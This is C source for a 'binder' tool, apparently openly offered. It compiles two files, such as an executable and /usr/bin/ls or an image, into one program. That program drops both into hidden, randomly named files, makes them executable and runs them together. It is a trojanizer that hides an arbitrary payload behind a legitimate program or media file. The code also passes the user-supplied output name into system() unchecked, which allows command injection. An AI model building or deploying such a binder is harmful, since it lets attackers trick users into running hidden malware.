#include "exeTOexe.h"

void seyArgError()
{
	printf(
	"\033[91mNAME\033[0m\n"
	"	IAIngectioner - a tools for create executable media\n"
	"\n"
	"\033[91mSYNOPSIS\033[0m\n"
	"	binder [first executable FILE] [second FILE] [output FILE]\n"
	"\n"
	"\033[91mEXAMPLE\033[0m\n"
	"	binder ./application /user/bin/ls ls\n"
	"	binder ./application ./image.png\n"
	"	binder ./application ./video.mp3\n"
	"\n"
	"	and another media\n"
	"\n"
	"\033[91mGITHUB\033[0m\n"
	"	https://github.com/alirezaarzehgar/IA-Injectioner-1.0.git"
	"	\n"

		);
}

int xxd_i(char* argv1, char* argv2)
{
        printf("\033[31mstart file copy\n\n");
	sleep(1);

        FILE* header = fopen(".h.h", "w");
        FILE* f1 = fopen(argv1, "r");
        FILE* f2 = fopen(argv2, "r");

        fprintf(header, "#ifndef H_H_\n#define H_H_\n\nunsigned char pro_one[] =\n{\n");

        int pro_len = 0;
	printf("\033[31mfrom first  program [\033[35m%d\033[31m] \033[31mcharacter binded\r", pro_len);

        while(1)
        {
                if(feof(f1)) break;
                pro_len++;
                fprintf(header, " %d,", fgetc(f1));
                if(pro_len % 25 == 0) fputc('\n', header);
		if(pro_len % 100000 == 0) printf("\033[31mfrom first  program [\033[35m%d\033[31m] \033[31mcharacter binded\r", pro_len);
        }

        fprintf(header, " 0\n};\n\nunsigned int pro_one_len = %d;\n", pro_len-1);

        //..................
	printf("\033[93m\t\t\t\t\t\t\t\tOK\n");

        fprintf(header, "\nunsigned char pro_two[] =\n{\n");

        pro_len = 0;
	printf("\033[31mfrom second program [\033[35m%d\033[31m] \033[31mcharacter binded\r", pro_len);

        while(1)
        {
		if(feof(f2)) break;
                pro_len++;
                fprintf(header, " %d,", fgetc(f2));
                if(pro_len % 25 == 0) fputc('\n', header);
                if(pro_len % 100000 == 0) printf("\033[31mfrom second program [\033[35m%d\033[31m] \033[31mcharacter binded\r", pro_len);
        }
        printf("\033[93m\t\t\t\t\t\t\t\tOK\n\n");

        fprintf(header, " 0\n};\n\nunsigned int pro_two_len = %d;\n\n#endif", pro_len-1);

        fclose(f1);
        fclose(f2);
        fclose(header);

	printf("\033[31mFinish file copy\n");
}

void programs_run(char* argv)
{
	printf("\033[31mstart create %s!\n", argv);
        char command[1000];
        sprintf(command, "gcc -w -o %s .p.c `pkg-config --libs --cflags gtk+-2.0`", argv);
        system(command);
	printf("\033[31mFitish create %s:)\n", argv);
}

void exeTOexeInP_c()
{
        FILE* f = fopen(".p.c", "w");
        fprintf(f,
                                        "#include <stdio.h>\n"
                                        "#include <stdlib.h>\n"
                                        "#include <sys/stat.h>\n"
                                        "#include <pthread.h>\n"
					"#include <time.h>\n"
                                        "#include \".h.h\"\n"
                                        "\n"
                                        "void* exec_1(void* arg);\n"
                                        "void* exec_2(void* arg);\n"
                                        "\n\n"
					"char rand1[100];\n"
					"char rand2[100];\n"
                                        "int main()\n"
                                        "{\n"
					"	 srand(time(NULL));\n"
					"	 sprintf(rand1, \"./.%%d%%d%%d\", rand() % 10, rand() % 10, rand() % 10);\n"
                                        "        sprintf(rand2, \"./.%%d%%d%%d\", rand() % 10, rand() % 10, rand() % 10);\n"
                                        "        FILE* f = fopen(rand1, \"wb\");\n"
                                        "        for(int i = 0; i < pro_one_len; i++) fprintf(f, \"%%c\", pro_one[i]);\n"
                                        "        fclose(f);\n"
                                        "\n"
                                        "        f = fopen(rand2, \"wb\");\n"
                                        "        for(int i = 0; i < pro_two_len; i++) fprintf(f, \"%%c\", pro_two[i]);\n"
                                        "        fclose(f);\n"
                                        "\n"
                                        "        chmod(rand1, 0775);\n"
                                        "        chmod(rand2, 0775);\n"
                                        "\n"
                                        "        pthread_t id;\n"
                                        "        pthread_create(&id, NULL, &exec_1, NULL);\n"
                                        "        pthread_create(&id, NULL, &exec_2, NULL);\n"
                                        "\n"
                                        "        while(1);\n"
                                        "        return 0;\n"
                                        "}\n"
                                        "\n"
                                        "void* exec_1(void* arg)\n"
                                        "{\n"
                                        "        system(rand1);\n"
                                        "        while(1);\n"
                                        "}\n"
                                        "\n"
                                        "void* exec_2(void* arg)\n"
                                        "{\n"
                                        "        system(rand2);\n"
                                        "        while(1);\n"
                                        "}\n"

	);
	fclose(f);
}

bool istrue(const char* str1, char* str2, int a)
{
        bool gh = true;

        for(int i = 0; i < a; i++)
        {
                if(str1[i] != str2[i])
                {
                        gh = false;
                        break;
                }
        }

        return gh;
}

bool file_exist(char* FILE_NAME)
{
	if(fopen(FILE_NAME, "r") != NULL) return true;
	else return false;
}

bool isExecutable(char* FILE_NAME)
{
	struct stat st;
	stat(FILE_NAME, &st);
	if(st.st_mode & S_IXUSR) return true;
	else return false;
}

bool isImage(char* FILE_NAME)
{
	if(strstr(FILE_NAME, ".png") || strstr(FILE_NAME, ".jpg") || strstr(FILE_NAME, ".jpeg")) return true;
	else return false;
}
